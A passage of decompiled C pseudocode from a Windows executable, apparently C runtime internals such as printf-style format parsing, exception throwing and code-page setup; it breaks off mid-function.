            if (ppauVar8 == (undefined (**) [16])0x49) {
              uVar2 = *puVar15;
              if ((uVar2 == 0x36) && (param_2[2] == 0x34)) {
                local_40c = local_40c | 0x8000;
                ppiVar12 = param_4;
                puVar15 = param_2 + 3;
              }
              else if ((uVar2 == 0x33) && (param_2[2] == 0x32)) {
                local_40c = local_40c & 0xffff7fff;
                ppiVar12 = param_4;
                puVar15 = param_2 + 3;
              }
              else {
                ppiVar12 = param_4;
                if (((((uVar2 != 100) && (uVar2 != 0x69)) && (uVar2 != 0x6f)) &&
                    ((uVar2 != 0x75 && (uVar2 != 0x78)))) && (uVar2 != 0x58)) {
                  local_438 = 0;
                  goto switchD_0041099e_caseD_0;
                }
              }
            }
            else if (ppauVar8 == (undefined (**) [16])0x68) {
              local_40c = local_40c | 0x20;
              ppiVar12 = param_4;
            }
            else if (ppauVar8 == (undefined (**) [16])0x6c) {
              if (*puVar15 == 0x6c) {
                local_40c = local_40c | 0x1000;
                ppiVar12 = param_4;
                puVar15 = param_2 + 2;
              }
              else {
                local_40c = local_40c | 0x10;
                ppiVar12 = param_4;
              }
            }
            else {
              ppiVar12 = param_4;
              if (ppauVar8 == (undefined (**) [16])0x77) {
                local_40c = local_40c | 0x800;
              }
            }
            break;
          case 7:
            if (ppauVar8 < (undefined (**) [16])0x65) {
              if (ppauVar8 == (undefined (**) [16])0x64) {
LAB_00410e9e:
                local_40c = local_40c | 0x40;
LAB_00410ea5:
                local_420 = (undefined (**) [16])0xa;
LAB_00410eaf:
                if (((local_40c & 0x8000) == 0) && ((local_40c & 0x1000) == 0)) {
                  local_41c = param_4 + 1;
                  if ((local_40c & 0x20) == 0) {
                    piVar13 = *param_4;
                    if ((local_40c & 0x40) == 0) {
                      piVar9 = (int *)0x0;
                    }
                    else {
                      piVar9 = (int *)((int)piVar13 >> 0x1f);
                    }
                  }
                  else {
                    if ((local_40c & 0x40) == 0) {
                      piVar13 = (int *)(uint)*(ushort *)param_4;
                    }
                    else {
                      piVar13 = (int *)(int)*(short *)param_4;
                    }
                    piVar9 = (int *)((int)piVar13 >> 0x1f);
                  }
                }
                else {
                  local_41c = param_4 + 2;
                  piVar13 = *param_4;
                  piVar9 = param_4[1];
                }
                if ((((local_40c & 0x40) != 0) && ((int)piVar9 < 1)) && ((int)piVar9 < 0)) {
                  bVar16 = piVar13 != (int *)0x0;
                  piVar13 = (int *)-(int)piVar13;
                  piVar9 = (int *)-((int)piVar9 + (uint)bVar16);
                  local_40c = local_40c | 0x100;
                }
                uVar17 = CONCAT44(piVar9,piVar13);
                if ((local_40c & 0x9000) == 0) {
                  piVar9 = (int *)0x0;
                }
                if ((int)local_410 < 0) {
                  local_410 = (int *)0x1;
                }
                else {
                  local_40c = local_40c & 0xfffffff7;
                  if (0x200 < (int)local_410) {
                    local_410 = (int *)0x200;
                  }
                }
                if (((uint)piVar13 | (uint)piVar9) == 0) {
                  local_428 = 0;
                }
                ppauVar14 = (undefined (**) [16])local_209;
                while( true ) {
                  iVar6 = (int)((ulonglong)uVar17 >> 0x20);
                  piVar13 = (int *)((int)local_410 + -1);
                  if (((int)local_410 < 1) && (((uint)uVar17 | (uint)piVar9) == 0)) break;
                  local_410 = piVar13;
                  uVar17 = FUN_004123a0((uint)uVar17,(uint)piVar9,(uint)local_420,
                                        (int)local_420 >> 0x1f);
                  piVar9 = (int *)((ulonglong)uVar17 >> 0x20);
                  ppauVar8 = (undefined (**) [16])(extraout_ECX_00 + 0x30);
                  if (0x39 < (int)ppauVar8) {
                    ppauVar8 = (undefined (**) [16])((int)ppauVar8 + local_458);
                  }
                  *(char *)ppauVar14 = (char)ppauVar8;
                  ppauVar14 = (undefined (**) [16])((int)ppauVar14 + -1);
                }
                local_418 = (undefined (**) [16])(local_209 + -(int)ppauVar14);
                local_414 = (undefined (**) [16])((int)ppauVar14 + 1);
                local_410 = piVar13;
                if (((local_40c & 0x200) != 0) &&
                   ((local_418 == (undefined (**) [16])0x0 ||
                    (ppauVar8 = local_414, *(char *)local_414 != '0')))) {
                  *(undefined *)ppauVar14 = 0x30;
                  local_418 = (undefined (**) [16])(local_209 + -(int)ppauVar14 + 1);
                  ppauVar8 = ppauVar14;
                  local_414 = ppauVar14;
                }
              }
              else if (ppauVar8 < (undefined (**) [16])0x54) {
                if (ppauVar8 == (undefined (**) [16])0x53) {
                  if ((local_40c & 0x830) == 0) {
                    local_40c = local_40c | 0x20;
                  }
                  goto LAB_00410c7d;
                }
                if (ppauVar8 != (undefined (**) [16])0x41) {
                  if (ppauVar8 == (undefined (**) [16])0x43) {
                    if ((local_40c & 0x830) == 0) {
                      local_40c = local_40c | 0x20;
                    }
LAB_00410d27:
                    WVar1 = *(WCHAR *)param_4;
                    local_468 = (undefined (**) [16])(uint)(ushort)WVar1;
                    local_41c = param_4 + 1;
                    local_42c = 1;
                    if ((local_40c & 0x20) == 0) {
                      local_408[0]._0_2_ = WVar1;
                    }
                    else {
                      local_43c = (byte)WVar1;
                      local_43b = 0;
                      iVar5 = FUN_004157fc((LPWSTR)local_408,&local_43c,
                                           *(uint *)(local_450[0][10] + 0xc),local_450);
                      ppauVar8 = extraout_ECX;
                      iVar6 = extraout_EDX_03;
                      if (iVar5 < 0) {
                        local_454 = 1;
                      }
                    }
                    local_418 = (undefined (**) [16])0x1;
                    local_414 = local_408;
                    goto LAB_004111ed;
                  }
                  if ((ppauVar8 != (undefined (**) [16])0x45) &&
                     (ppauVar8 != (undefined (**) [16])0x47)) goto LAB_004111ed;
                }
                local_460 = 1;
                local_420 = ppauVar8 + 8;
LAB_00410c14:
                local_40c = local_40c | 0x40;
                local_418 = (undefined (**) [16])0x200;
                ppauVar8 = local_408;
                ppauVar14 = local_418;
                ppauVar18 = local_408;
                if ((int)local_410 < 0) {
                  local_410 = (int *)&DAT_00000006;
                }
                else if (local_410 == (int *)0x0) {
                  if ((short)local_420 == 0x67) {
                    local_410 = (int *)0x1;
                  }
                }
                else {
                  if (0x200 < (int)local_410) {
                    local_410 = (int *)0x200;
                  }
                  if (0xa3 < (int)local_410) {
                    ppauVar14 = (undefined (**) [16])((int)local_410 + 0x15d);
                    local_414 = local_408;
                    local_45c = (undefined (**) [16])FUN_00413b52((uint)ppauVar14);
                    ppauVar8 = local_45c;
                    ppauVar18 = local_45c;
                    if (local_45c == (undefined (**) [16])0x0) {
                      local_410 = (int *)0xa3;
                      ppauVar8 = local_408;
                      ppauVar14 = local_418;
                      ppauVar18 = local_414;
                    }
                  }
                }
                local_414 = ppauVar18;
                local_418 = ppauVar14;
                local_470 = *param_4;
                local_41c = param_4 + 2;
                local_46c = param_4[1];
                ppauVar14 = local_450;
                iVar6 = (int)(char)local_420;
                ppiVar12 = &local_470;
                ppauVar18 = ppauVar8;
                ppauVar19 = local_418;
                piVar13 = local_410;
                uVar10 = local_460;
                pcVar7 = (code *)FUN_0040cb6e(DAT_00422df8);
                (*pcVar7)(ppiVar12,ppauVar18,ppauVar19,iVar6,piVar13,uVar10,ppauVar14);
                uVar4 = local_40c & 0x80;
                if ((uVar4 != 0) && (local_410 == (int *)0x0)) {
                  ppauVar14 = local_450;
                  ppauVar18 = ppauVar8;
                  pcVar7 = (code *)FUN_0040cb6e(DAT_00422e04);
                  (*pcVar7)(ppauVar18,ppauVar14);
                }
                if (((short)local_420 == 0x67) && (uVar4 == 0)) {
                  ppauVar14 = local_450;
                  ppauVar18 = ppauVar8;
                  pcVar7 = (code *)FUN_0040cb6e(DAT_00422e00);
                  (*pcVar7)(ppauVar18,ppauVar14);
                }
                if (*(char *)ppauVar8 == '-') {
                  local_40c = local_40c | 0x100;
                  ppauVar8 = (undefined (**) [16])((int)ppauVar8 + 1);
                  local_414 = ppauVar8;
                }
LAB_00410e00:
                local_418 = (undefined (**) [16])FUN_00415330((uint *)ppauVar8);
                iVar6 = extraout_EDX_04;
              }
              else {
                if (ppauVar8 == (undefined (**) [16])0x58) goto LAB_00410ffe;
                if (ppauVar8 == (undefined (**) [16])0x5a) {
                  piVar13 = *param_4;
                  local_41c = param_4 + 1;
                  if ((piVar13 == (int *)0x0) ||
                     (ppauVar8 = (undefined (**) [16])piVar13[1],
                     ppauVar8 == (undefined (**) [16])0x0)) {
                    local_414 = DAT_00422db0;
                    ppauVar8 = DAT_00422db0;
                    goto LAB_00410e00;
                  }
                  local_418 = (undefined (**) [16])(int)*(short *)piVar13;
                  local_414 = ppauVar8;
                  if ((local_40c & 0x800) != 0) {
                    iVar6 = (int)local_418 >> 0x1f;
                    iVar5 = (int)local_418 - iVar6;
                    goto LAB_004111e5;
                  }
                  local_42c = 0;
                }
                else {
                  if (ppauVar8 == (undefined (**) [16])0x61) goto LAB_00410c14;
                  if (ppauVar8 == (undefined (**) [16])0x63) goto LAB_00410d27;
                }
              }
LAB_004111ed:
              ppauVar14 = local_418;
              if (local_454 == 0) {
                if ((local_40c & 0x40) != 0) {
                  if ((local_40c & 0x100) == 0) {
                    if ((local_40c & 1) == 0) {
                      if ((local_40c & 2) == 0) goto LAB_0041122f;
                      local_434 = L' ';
                    }
                    else {
                      local_434 = L'+';
                    }
                  }
                  else {
                    local_434 = L'-';
                  }
                  local_428 = 1;
                }
LAB_0041122f:
                puVar11 = (undefined *)((int)local_430 + (-local_428 - (int)local_418));
                if ((local_40c & 0xc) == 0) {
                  FUN_004107e4(ppauVar8,iVar6,0x20,(int)puVar11);
                  iVar6 = extraout_EDX_06;
                }
                iVar5 = local_428;
                FUN_0041080b(&local_434,iVar6,local_428);
                uVar10 = extraout_EDX_07;
                if (((local_40c & 8) != 0) && ((local_40c & 4) == 0)) {
                  FUN_004107e4(iVar5,extraout_EDX_07,0x30,(int)puVar11);
                  uVar10 = extraout_EDX_08;
                }
                if ((local_42c == 0) && (0 < (int)ppauVar14)) {
                  local_420 = ppauVar14;
                  ppauVar8 = local_414;
                  do {
                    local_420 = (undefined (**) [16])((int)local_420 + -1);
                    iVar6 = FUN_004157fc((LPWSTR)&local_468,(byte *)ppauVar8,
                                         *(uint *)(local_450[0][10] + 0xc),local_450);
                    if (iVar6 < 1) {
                      local_424 = -1;
                      ppauVar14 = extraout_ECX_01;
                      iVar6 = extraout_EDX_09;
                      break;
                    }
                    ppauVar14 = local_468;
                    FUN_004107b5(extraout_ECX_01,extraout_EDX_09,(WCHAR)local_468);
                    ppauVar8 = (undefined (**) [16])((int)ppauVar8 + iVar6);
                    iVar6 = extraout_EDX_10;
                  } while (0 < (int)local_420);
                }
                else {
                  FUN_0041080b((WCHAR *)local_414,uVar10,(int)ppauVar14);
                  iVar6 = extraout_EDX_11;
                }
                if ((-1 < local_424) && ((local_40c & 4) != 0)) {
                  FUN_004107e4(ppauVar14,iVar6,0x20,(int)puVar11);
                  iVar6 = extraout_EDX_12;
                }
              }
            }
            else {
              if ((undefined (**) [16])0x70 < ppauVar8) {
                if (ppauVar8 == (undefined (**) [16])0x73) {
LAB_00410c7d:
                  piVar13 = local_410;
                  if (local_410 == (int *)0xffffffff) {
                    piVar13 = (int *)0x7fffffff;
                  }
                  local_41c = param_4 + 1;
                  local_414 = (undefined (**) [16])*param_4;
                  if ((local_40c & 0x20) == 0) {
                    ppauVar14 = local_414;
                    if (local_414 == (undefined (**) [16])0x0) {
                      local_414 = DAT_00422db4;
                      ppauVar14 = DAT_00422db4;
                    }
                    for (; (piVar13 != (int *)0x0 &&
                           (piVar13 = (int *)((int)piVar13 + -1), *(short *)ppauVar14 != 0));
                        ppauVar14 = (undefined (**) [16])((int)ppauVar14 + 2)) {
                    }
                    iVar5 = (int)ppauVar14 - (int)local_414;
LAB_004111e5:
                    local_41c = param_4 + 1;
                    local_42c = 1;
                    local_418 = (undefined (**) [16])(iVar5 >> 1);
                  }
                  else {
                    if (local_414 == (undefined (**) [16])0x0) {
                      local_414 = DAT_00422db0;
                    }
                    local_418 = (undefined (**) [16])0x0;
                    ppauVar14 = local_414;
                    if (0 < (int)piVar13) {
                      do {
                        if (*(byte *)ppauVar14 == 0) break;
                        ppauVar8 = local_450;
                        uVar2 = FUN_0041592d(*(byte *)ppauVar14,ppauVar8);
                        if (CONCAT22(extraout_var_00,uVar2) != 0) {
                          ppauVar14 = (undefined (**) [16])((int)ppauVar14 + 1);
                        }
                        ppauVar14 = (undefined (**) [16])((int)ppauVar14 + 1);
                        local_418 = (undefined (**) [16])((int)local_418 + 1);
                        iVar6 = extraout_EDX_02;
                      } while ((int)local_418 < (int)piVar13);
                    }
                  }
                  goto LAB_004111ed;
                }
                if (ppauVar8 == (undefined (**) [16])0x75) goto LAB_00410ea5;
                if (ppauVar8 != (undefined (**) [16])0x78) goto LAB_004111ed;
                local_458 = 0x27;
LAB_0041102e:
                local_420 = (undefined (**) [16])0x10;
                if ((local_40c & 0x80) != 0) {
                  local_434 = L'0';
                  local_432 = (short)local_458 + 0x51;
                  local_428 = iVar6;
                }
                goto LAB_00410eaf;
              }
              if (ppauVar8 == (undefined (**) [16])0x70) {
                local_410 = (int *)0x8;
LAB_00410ffe:
                local_458 = 7;
                goto LAB_0041102e;
              }
              if (ppauVar8 < (undefined (**) [16])0x65) goto LAB_004111ed;
              if (ppauVar8 < (undefined (**) [16])0x68) goto LAB_00410c14;
              if (ppauVar8 == (undefined (**) [16])0x69) goto LAB_00410e9e;
              if (ppauVar8 != (undefined (**) [16])0x6e) {
                if (ppauVar8 != (undefined (**) [16])0x6f) goto LAB_004111ed;
                local_420 = (undefined (**) [16])0x8;
                if ((local_40c & 0x80) != 0) {
                  local_40c = local_40c | 0x200;
                }
                goto LAB_00410eaf;
              }
              piVar13 = *param_4;
              local_41c = param_4 + 1;
              bVar16 = FUN_00415b32();
              if (CONCAT31(extraout_var,bVar16) == 0) goto switchD_0041099e_caseD_9;
              if ((local_40c & 0x20) == 0) {
                *piVar13 = local_424;
              }
              else {
                *(short *)piVar13 = (short)local_424;
              }
              local_454 = 1;
              iVar6 = extraout_EDX_05;
            }
            ppiVar12 = local_41c;
            puVar15 = local_464;
            if (local_45c != (undefined (**) [16])0x0) {
              FUN_0040b61e();
              local_45c = (undefined (**) [16])0x0;
              iVar6 = extraout_EDX_13;
              ppiVar12 = local_41c;
              puVar15 = local_464;
            }
            break;
          default:
            goto switchD_0041099e_caseD_9;
          case 0xbad1abe1:
            break;
          }
          ppauVar8 = (undefined (**) [16])(uint)*puVar15;
          param_4 = ppiVar12;
          param_2 = puVar15;
          local_420 = ppauVar8;
        } while (*puVar15 != 0);
        if ((local_438 != 0) && (local_438 != 7)) goto LAB_00410903;
      }
      if (local_444 != '\0') {
        *(uint *)(local_448 + 0x70) = *(uint *)(local_448 + 0x70) & 0xfffffffd;
      }
      goto LAB_004113cc;
    }
LAB_00410903:
    puVar3 = (undefined4 *)FUN_0040caaa();
    *puVar3 = 0x16;
  }
  FUN_0040ca42();
  iVar6 = extraout_EDX_00;
  if (local_444 != '\0') {
    *(uint *)(local_448 + 0x70) = *(uint *)(local_448 + 0x70) & 0xfffffffd;
  }
LAB_004113cc:
  FUN_0040a982(local_8 ^ (uint)&stack0xfffffffc,iVar6);
  return;
}



undefined4 * __thiscall FUN_004113fd(void *this,uint **param_1)

{
  char *pcVar1;
  char *pcVar2;
  
  *(undefined **)this = &DAT_0041c940;
  if (*param_1 == (uint *)0x0) {
    *(undefined4 *)((int)this + 4) = 0;
  }
  else {
    pcVar1 = FUN_00415330(*param_1);
    pcVar2 = (char *)FUN_0040afc0((uint)(pcVar1 + 1));
    *(char **)((int)this + 4) = pcVar2;
    if (pcVar2 != (char *)0x0) {
      FUN_0040bcd6(pcVar2,(int)(pcVar1 + 1),(char *)*param_1);
    }
  }
  *(undefined4 *)((int)this + 8) = 1;
  return (undefined4 *)this;
}



void __thiscall FUN_00411450(void *this,undefined4 *param_1)

{
  undefined4 uVar1;
  
  *(undefined **)this = &DAT_0041c940;
  uVar1 = *param_1;
  *(undefined4 *)((int)this + 8) = 0;
  *(undefined4 *)((int)this + 4) = uVar1;
  return;
}



undefined4 * __thiscall FUN_0041146d(void *this,int param_1)

{
  int iVar1;
  uint *puVar2;
  char *pcVar3;
  char *pcVar4;
  
  *(undefined **)this = &DAT_0041c940;
  iVar1 = *(int *)(param_1 + 8);
  *(int *)((int)this + 8) = iVar1;
  puVar2 = *(uint **)(param_1 + 4);
  if (iVar1 == 0) {
    *(uint **)((int)this + 4) = puVar2;
  }
  else if (puVar2 == (uint *)0x0) {
    *(undefined4 *)((int)this + 4) = 0;
  }
  else {
    pcVar3 = FUN_00415330(puVar2);
    pcVar4 = (char *)FUN_0040afc0((uint)(pcVar3 + 1));
    *(char **)((int)this + 4) = pcVar4;
    if (pcVar4 != (char *)0x0) {
      FUN_0040bcd6(pcVar4,(int)(pcVar3 + 1),*(char **)(param_1 + 4));
    }
  }
  return (undefined4 *)this;
}



void __fastcall FUN_004114ca(undefined4 *param_1)

{
  *param_1 = &DAT_0041c940;
  if (param_1[2] != 0) {
    FUN_0040b61e();
  }
  return;
}



undefined4 * __thiscall FUN_004114ed(void *this,byte param_1)

{
  FUN_004114ca((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040b6ac();
  }
  return (undefined4 *)this;
}



void __fastcall FUN_0041150e(undefined4 *param_1)

{
  *param_1 = &DAT_0041c960;
  FUN_00415b48();
  return;
}



undefined4 * __thiscall FUN_0041151e(void *this,byte param_1)

{
  FUN_0041150e((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040b6ac();
  }
  return (undefined4 *)this;
}



bool __thiscall FUN_0041153f(void *this,int param_1)

{
  int iVar1;
  
  iVar1 = FUN_00415bc0((undefined4 *)(param_1 + 9),(byte *)((int)this + 9));
  return (bool)('\x01' - (iVar1 != 0));
}



int __cdecl FUN_0041155f(int param_1)

{
  int *piVar1;
  int *piVar2;
  SIZE_T SVar3;
  SIZE_T SVar4;
  LPVOID pvVar5;
  int iVar6;
  
  piVar1 = (int *)FUN_0040cb6e(DAT_00425784);
  piVar2 = (int *)FUN_0040cb6e(DAT_00425780);
  if ((piVar2 < piVar1) || (iVar6 = (int)piVar2 - (int)piVar1, iVar6 + 4U < 4)) {
    return 0;
  }
  SVar3 = FUN_00415c48();
  if (SVar3 < iVar6 + 4U) {
    SVar4 = 0x800;
    if (SVar3 < 0x800) {
      SVar4 = SVar3;
    }
    if ((SVar4 + SVar3 < SVar3) ||
       (pvVar5 = FUN_00413be3(piVar1,SVar4 + SVar3), pvVar5 == (LPVOID)0x0)) {
      if (SVar3 + 0x10 < SVar3) {
        return 0;
      }
      pvVar5 = FUN_00413be3(piVar1,SVar3 + 0x10);
      if (pvVar5 == (LPVOID)0x0) {
        return 0;
      }
    }
    piVar2 = (int *)((int)pvVar5 + (iVar6 >> 2) * 4);
    DAT_00425784 = FUN_0040caf3((int)pvVar5);
  }
  iVar6 = FUN_0040caf3(param_1);
  *piVar2 = iVar6;
  DAT_00425780 = FUN_0040caf3((int)(piVar2 + 1));
  return param_1;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_0041164a(void)

{
  int iVar1;
  int unaff_EBP;
  
  FUN_0040d634(&DAT_004205c0,0xc);
  FUN_0040ec18();
  *(undefined4 *)(unaff_EBP + -4) = 0;
  iVar1 = FUN_0041155f(*(int *)(unaff_EBP + 8));
  *(int *)(unaff_EBP + -0x1c) = iVar1;
  *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
  FUN_00411680();
  return *(undefined4 *)(unaff_EBP + -0x1c);
}



void FUN_00411680(void)

{
  FUN_0040ec21();
  return;
}



int FUN_00411686(undefined4 param_1)

{
  int iVar1;
  
  iVar1 = FUN_0041164a();
  return (iVar1 != 0) - 1;
}



void __CxxThrowException_8(undefined4 param_1,byte *param_2)

{
  int iVar1;
  DWORD *pDVar2;
  DWORD *pDVar3;
  DWORD local_24 [4];
  DWORD local_14;
  ULONG_PTR local_10;
  undefined4 local_c;
  byte *local_8;
  
  pDVar2 = &DAT_0041c964;
  pDVar3 = local_24;
  for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {
    *pDVar3 = *pDVar2;
    pDVar2 = pDVar2 + 1;
    pDVar3 = pDVar3 + 1;
  }
  local_c = param_1;
  local_8 = param_2;
  if ((param_2 != (byte *)0x0) && ((*param_2 & 8) != 0)) {
    local_10 = 0x1994000;
  }
  RaiseException(local_24[0],local_24[1],local_14,&local_10);
  return;
}



undefined4 FUN_004116e9(void)

{
  int in_EAX;
  
  if (in_EAX == 0x3a4) {
    return 0x411;
  }
  if (in_EAX == 0x3a8) {
    return 0x804;
  }
  if (in_EAX == 0x3b5) {
    return 0x412;
  }
  if (in_EAX != 0x3b6) {
    return 0;
  }
  return 0x404;
}



void FUN_00411718(void)

{
  int in_EAX;
  undefined *puVar1;
  int iVar2;
  
  FUN_0040f8c0((undefined (*) [16])(in_EAX + 0x1c),0,0x101);
  *(undefined4 *)(in_EAX + 4) = 0;
  *(undefined4 *)(in_EAX + 8) = 0;
  *(undefined4 *)(in_EAX + 0xc) = 0;
  *(undefined4 *)(in_EAX + 0x10) = 0;
  *(undefined4 *)(in_EAX + 0x14) = 0;
  *(undefined4 *)(in_EAX + 0x18) = 0;
  puVar1 = (undefined *)(in_EAX + 0x1c);
  iVar2 = 0x101;
  do {
    *puVar1 = puVar1[(int)&DAT_00422790 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  puVar1 = (undefined *)(in_EAX + 0x11d);
  iVar2 = 0x100;
  do {
    *puVar1 = puVar1[(int)&DAT_00422790 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  return;
}



void FUN_0041177c(void)

{
  byte *pbVar1;
  char *pcVar2;
  BOOL BVar3;
  uint uVar4;
  undefined uVar5;
  char cVar6;
  char *extraout_EDX;
  char *pcVar7;
  BYTE *pBVar8;
  int unaff_ESI;
  _cpinfo local_51c;
  WORD local_508 [256];
  WCHAR local_308 [128];
  WCHAR local_208 [128];
  uint local_108 [64];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  BVar3 = GetCPInfo(*(UINT *)(unaff_ESI + 4),&local_51c);
  if (BVar3 == 0) {
    uVar4 = 0;
    do {
      pcVar2 = (char *)(unaff_ESI + 0x11d + uVar4);
      pcVar7 = pcVar2 + (-0x61 - (unaff_ESI + 0x11d));
      if (pcVar7 + 0x20 < (char *)0x1a) {
        pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
        *pbVar1 = *pbVar1 | 0x10;
        cVar6 = (char)uVar4 + ' ';
LAB_004118f5:
        pcVar7 = (char *)CONCAT31((int3)((uint)pcVar7 >> 8),cVar6);
        *pcVar2 = cVar6;
      }
      else {
        if (pcVar7 < (char *)0x1a) {
          pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
          *pbVar1 = *pbVar1 | 0x20;
          cVar6 = (char)uVar4 + -0x20;
          goto LAB_004118f5;
        }
        *pcVar2 = '\0';
      }
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  else {
    uVar4 = 0;
    do {
      *(char *)((int)local_108 + uVar4) = (char)uVar4;
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
    local_108[0]._0_1_ = 0x20;
    if (local_51c.LeadByte[0] != 0) {
      pBVar8 = local_51c.LeadByte + 1;
      do {
        uVar4 = (uint)local_51c.LeadByte[0];
        if (uVar4 <= *pBVar8) {
          FUN_0040f8c0((undefined (*) [16])((int)local_108 + uVar4),0x20,(*pBVar8 - uVar4) + 1);
        }
        local_51c.LeadByte[0] = pBVar8[1];
        pBVar8 = pBVar8 + 2;
      } while (local_51c.LeadByte[0] != 0);
    }
    FUN_0041628f((undefined (**) [16])0x0,1,local_108,0x100,local_508,*(UINT *)(unaff_ESI + 4),
                 *(LCID *)(unaff_ESI + 0xc),0);
    FUN_00416090((undefined (**) [16])0x0,*(LCID *)(unaff_ESI + 0xc),0x100,local_108,0x100,local_208
                 ,0x100,*(UINT *)(unaff_ESI + 4),0);
    FUN_00416090((undefined (**) [16])0x0,*(LCID *)(unaff_ESI + 0xc),0x200,local_108,0x100,local_308
                 ,0x100,*(UINT *)(unaff_ESI + 4),0);
    uVar4 = 0;
    do {
      if ((local_508[uVar4] & 1) == 0) {
        if ((local_508[uVar4] & 2) != 0) {
          pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
          *pbVar1 = *pbVar1 | 0x20;
          uVar5 = *(undefined *)((int)local_308 + uVar4);
          goto LAB_00411893;
        }
        *(undefined *)(unaff_ESI + 0x11d + uVar4) = 0;
      }
      else {
        pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
        *pbVar1 = *pbVar1 | 0x10;
        uVar5 = *(undefined *)((int)local_208 + uVar4);
LAB_00411893:
        *(undefined *)(unaff_ESI + 0x11d + uVar4) = uVar5;
      }
      uVar4 = uVar4 + 1;
      pcVar7 = extraout_EDX;
    } while (uVar4 < 0x100);
  }
  FUN_0040a982(local_8 ^ (uint)&stack0xfffffffc,pcVar7);
  return;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

LONG * FUN_0041190f(void)

{
  undefined (*pauVar1) [16];
  LONG LVar2;
  int unaff_EBP;
  LONG *lpAddend;
  
  FUN_0040d634(&DAT_004205e0,0xc);
  pauVar1 = FUN_0040cdba();
  if (((*(uint *)pauVar1[7] & DAT_00422cb4) == 0) || (*(int *)(pauVar1[6] + 0xc) == 0)) {
    FUN_0040e055(0xd);
    *(undefined4 *)(unaff_EBP + -4) = 0;
    lpAddend = *(LONG **)(pauVar1[6] + 8);
    *(LONG **)(unaff_EBP + -0x1c) = lpAddend;
    if (lpAddend != DAT_00422bb8) {
      if (lpAddend != (LONG *)0x0) {
        LVar2 = InterlockedDecrement(lpAddend);
        if ((LVar2 == 0) && (lpAddend != (LONG *)&DAT_00422790)) {
          FUN_0040b61e();
        }
      }
      *(LONG **)(pauVar1[6] + 8) = DAT_00422bb8;
      lpAddend = DAT_00422bb8;
      *(LONG **)(unaff_EBP + -0x1c) = DAT_00422bb8;
      InterlockedIncrement(lpAddend);
    }
    *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
    FUN_004119aa();
  }
  else {
    lpAddend = *(LONG **)(pauVar1[6] + 8);
  }
  if (lpAddend == (LONG *)0x0) {
    FUN_0040ebac(0x20);
  }
  return lpAddend;
}



void FUN_004119aa(void)

{
  FUN_0040df7b(0xd);
  return;
}



void FUN_004119b3(void)

{
  int unaff_ESI;
  undefined local_14 [8];
  int local_c;
  char local_8;
  
  FUN_0040b970(local_14,(undefined (**) [16])0x0);
  DAT_004241cc = 0;
  if (unaff_ESI == -2) {
    DAT_004241cc = 1;
    GetOEMCP();
  }
  else if (unaff_ESI == -3) {
    DAT_004241cc = 1;
    GetACP();
  }
  else {
    if (unaff_ESI != -4) {
      if (local_8 == '\0') {
        DAT_004241cc = 0;
        return;
      }
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      return;
    }
    DAT_004241cc = 1;
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



void __cdecl FUN_00411a2f(undefined4 param_1,int param_2)

{
  BYTE *pBVar1;
  byte *pbVar2;
  byte bVar3;
  uint uVar4;
  BOOL BVar5;
  uint uVar6;
  undefined2 *puVar7;
  byte *pbVar8;
  undefined4 uVar9;
  int extraout_ECX;
  undefined2 *puVar10;
  int iVar11;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  BYTE *pBVar12;
  undefined8 uVar13;
  uint local_24;
  byte *local_20;
  _cpinfo local_1c;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  uVar13 = FUN_004119b3();
  uVar9 = (undefined4)((ulonglong)uVar13 >> 0x20);
  uVar6 = (uint)uVar13;
  if (uVar6 != 0) {
    local_20 = (byte *)0x0;
    uVar4 = 0;
LAB_00411a6d:
    if (*(uint *)((int)&DAT_00422bc0 + uVar4) != uVar6) goto code_r0x00411a79;
    FUN_0040f8c0((undefined (*) [16])(param_2 + 0x1c),0,0x101);
    local_24 = 0;
    pbVar8 = &DAT_00422bd0 + (int)local_20 * 0x30;
    local_20 = pbVar8;
    do {
      for (; (*pbVar8 != 0 && (bVar3 = pbVar8[1], bVar3 != 0)); pbVar8 = pbVar8 + 2) {
        for (uVar4 = (uint)*pbVar8; uVar4 <= bVar3; uVar4 = uVar4 + 1) {
          pbVar2 = (byte *)(param_2 + 0x1d + uVar4);
          *pbVar2 = *pbVar2 | (&DAT_00422bbc)[local_24];
          bVar3 = pbVar8[1];
        }
      }
      local_24 = local_24 + 1;
      pbVar8 = local_20 + 8;
      local_20 = pbVar8;
    } while (local_24 < 4);
    *(uint *)(param_2 + 4) = uVar6;
    *(undefined4 *)(param_2 + 8) = 1;
    uVar9 = FUN_004116e9();
    *(undefined4 *)(param_2 + 0xc) = uVar9;
    puVar7 = (undefined2 *)(param_2 + 0x10);
    puVar10 = (undefined2 *)(&DAT_00422bc4 + extraout_ECX);
    iVar11 = 6;
    do {
      *puVar7 = *puVar10;
      puVar10 = puVar10 + 1;
      puVar7 = puVar7 + 1;
      iVar11 = iVar11 + -1;
    } while (iVar11 != 0);
    goto LAB_00411b9e;
  }
LAB_00411a5a:
  FUN_00411718();
  uVar9 = extraout_EDX;
LAB_00411c05:
  FUN_0040a982(local_8 ^ (uint)&stack0xfffffffc,uVar9);
  return;
code_r0x00411a79:
